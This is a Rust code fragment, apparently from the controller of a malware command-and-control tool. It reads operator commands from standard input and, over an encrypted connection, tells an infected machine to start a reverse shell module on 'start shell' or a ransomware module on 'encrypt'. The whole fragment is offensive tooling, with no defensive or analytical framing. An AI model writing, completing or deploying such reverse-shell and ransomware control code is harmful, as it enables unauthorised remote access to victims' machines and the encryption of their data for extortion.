                async_handle.spawn( async move {
                    loop {
                        let mut input = [0; 1024];
                        let n = io::stdin().read(&mut input).await?;
                        
                        match &input[..n] {
                            b"start shell\r\n" => {
                                if io_present_modules.contains_key(&ModuleType::ReverseShell) {
                                    let data = ControlPacket {
                                        module_type: ModuleType::ReverseShell,
                                        control_code: ControlCode::Start
                                    };
                                    let (sx, rx) = mpsc::channel(64);
                                    *io_present_modules.get(&ModuleType::ReverseShell).unwrap().lock().await = sx;
                                    encrypted_write_from_key(stream_write.clone(), &key, data).await?;
                                    reverse_shell_handler(rx, stream_write.clone(), &key).await?;
                                } else {
                                    io::stdout().write_all(b"ReverseShell Module is not present for this connection").await?;
                                }
                            }

                            b"encrypt\r\n" => {
                                if io_present_modules.contains_key(&ModuleType::RansomWare) {
                                    let (sx, rx) = mpsc::channel(64);
                                    *io_present_modules.get(&ModuleType::RansomWare).unwrap().lock().await = sx;         
                                    ransomware_handler(rx, stream_write.clone(), &key).await?;
                                } else {
                                    io::stdout().write_all(b"RansomWare Module not present").await?;
                                }
                            }

                            _ => ()
                        }
    
                    }
                    Ok::<(), std::io::Error>(())
                });